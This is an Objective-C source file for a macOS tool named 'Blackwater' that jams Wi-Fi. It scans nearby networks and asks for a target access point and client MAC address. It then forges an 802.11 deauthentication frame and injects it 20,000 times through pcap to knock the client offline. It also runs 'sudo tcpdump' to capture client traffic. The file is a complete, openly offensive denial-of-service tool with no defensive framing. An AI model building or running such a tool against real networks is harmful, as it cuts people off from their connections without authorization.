//-----------------------------------------------------------------------------------------
//
// PROJECT
// -------
// The 'Blackwater' Project
//
// DESCRIPTION
// -----------
// OSX wifi jamming
//
// AUTHOR
// ------
// Lumberjacks Incorperated (2018)
//
//-----------------------------------------------------------------------------------------

//-----------------------------------------------------------------------------------------
//  INCLUDES
//-----------------------------------------------------------------------------------------
#import <pcap.h>
#import <unistd.h>

// Frameworks needed
#import <Foundation/Foundation.h>
#import <CoreWLAN/CoreWLAN.h>

// Interface file
#import "blackwater.h"

// SR Library
#import "srLibrary.h"

//-----------------------------------------------------------------------------------------
//  DEFINITIONS
//-----------------------------------------------------------------------------------------
#define DEAUTH_REQ \
"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

//-----------------------------------------------------------------------------------------
//  PRIVATE FUNCTION FORWARD DECLARATIONS
//-----------------------------------------------------------------------------------------
void printNetworkInformation(CWNetwork * network);
NSArray * obtainWifiNetworkList(void);
void convertMacToHex(const char * macString, unsigned char * macHex);
pcap_t * setupPcap(void);
void getBSSID(unsigned char* bssidBuffer);
void getClientMac(unsigned char* clientMacBuffer);
void createAndSentDeauth(unsigned char* bssid, unsigned char* client);

//----------------------------------------------------------------------------------------
//  IMPLEMENTED CLASS
//----------------------------------------------------------------------------------------
@implementation blackwater

- (void)
    listInterfaces
PRE(
    TRUE)
    
    NSArray *allNetworks = obtainWifiNetworkList();
    
    for( CWNetwork *network in allNetworks ) {
        printNetworkInformation( network );
    }
    
POST(
    ,TRUE)

- (void)
    jamWifiNetwork
PRE(
    TRUE)
    
    unsigned char bssidToJam[6];
    unsigned char clientToJam[6];
    
    getBSSID( bssidToJam );
    getClientMac( clientToJam );
    createAndSentDeauth( bssidToJam, clientToJam );
    
POST(
    ,TRUE)

- (void)
    printClientList
PRE(
    TRUE)
    
    system( "pwd" );
    system( "sudo tcpdump -i en0 -en > out.pcap" );
    system( "./printFile.sh out.pcap" );
    
POST(
    ,TRUE)

@end

//----------------------------------------------------------------------------------------
//  PRIVATE FUNCTIONS
//----------------------------------------------------------------------------------------
void
    printNetworkInformation (
        CWNetwork*        network
    )
PRE(
    TRUE)
    
    printf( "\nBSSID               :%s\n", [ network.bssid UTF8String ] );
    printf( "SSID                :%s\n", [ network.ssid UTF8String ] );
    printf( "Noise Measurement   :%ld\n", network.noiseMeasurement );
    printf( "RSSI                :%ld\n", network.rssiValue );
    
POST(
    ,TRUE)

NSArray*
    obtainWifiNetworkList(
        void
    )
PRE(
    TRUE)
    
    CWWiFiClient * client = [ [ CWWiFiClient alloc ] init ];
    CWInterface * cwInterface = [ client interfaceWithName:@"en0" ];
    NSError *err = nil;
    NSSet *networksSet = [ cwInterface scanForNetworksWithName:nil error:&err ];
    
POST(
    [ networksSet allObjects ]
    ,TRUE)

void
    convertMacToHex (
        const char* macString,
        unsigned char* macHex
    )
PRE(
    TRUE)
    
    NSString * macStringNS = [ NSString stringWithUTF8String:macString ];
    NSArray * components = [ macStringNS componentsSeparatedByString:@":" ];
    
    for (int i = 0; i < [ components count ]; i++) {
        if (i >= 6) break;
        unsigned result = 0;
        NSScanner * scanner = [ NSScanner scannerWithString:[ components objectAtIndex:i ] ];
        [ scanner scanHexInt:&result ];
        macHex[ i ] = result;
    }
    
POST(
    ,TRUE)

pcap_t*
    setupPcap(
        void
    )
PRE(
    TRUE)
    
    pcap_t * newPcap;
    char pcapError[ PCAP_ERRBUF_SIZE ];
    
    CWInterface * interface = [ [ CWInterface alloc ] initWithInterfaceName:@"en0" ];
    [ interface disassociate ];
    
    if( !interface ) return NULL;
    newPcap = pcap_open_live([@"en0" UTF8String], 65536, 1, 1, pcapError);
    
    if( !newPcap ) return NULL;
    pcap_set_datalink( newPcap, DLT_IEEE802_11_RADIO );
    
POST(
    newPcap
    ,TRUE)

void
    getBSSID (
        unsigned char* bssidBuffer
    )
PRE(
    TRUE)
    
    char bssidRawInput[ 40 ];
    
    printf( "Enter bssid:" );
    scanf( "%17s", &bssidRawInput );
    convertMacToHex( bssidRawInput, bssidBuffer );
    
POST(
    ,TRUE)

void
    getClientMac (
        unsigned char* clientMacBuffer
    )
PRE(
    TRUE)
    
    char clientMacRaw[ 40 ];
    printf( "Enter client mac:" );
    scanf( "%17s", &clientMacRaw );
    convertMacToHex( clientMacRaw, clientMacBuffer );
    
POST(
    ,TRUE)

void
    createAndSentDeauth (
        unsigned char* bssid,
        unsigned char* client
    )
PRE(
    TRUE)
    
    pcap_t * pcapHandle = setupPcap();
    unsigned char* packet = malloc(sizeof(char)*34);
    uint16_t packetFormatLength = 8;
    int packetSendCounter = 0;
    
    if(!packet) return;
    
    memcpy(&packet[8], DEAUTH_REQ, 26);
    memcpy(&packet[12],  client, 6);
    memcpy(&packet[18], bssid, 6);
    memcpy(&packet[24], bssid, 6);
    memcpy(&packet[2], &packetFormatLength, 2);
    
    while(
            packetSendCounter < 20000
         )
    {
        pcap_inject(pcapHandle, packet, 34);
        packetSendCounter++;
    }
    
POST(
    ,TRUE)
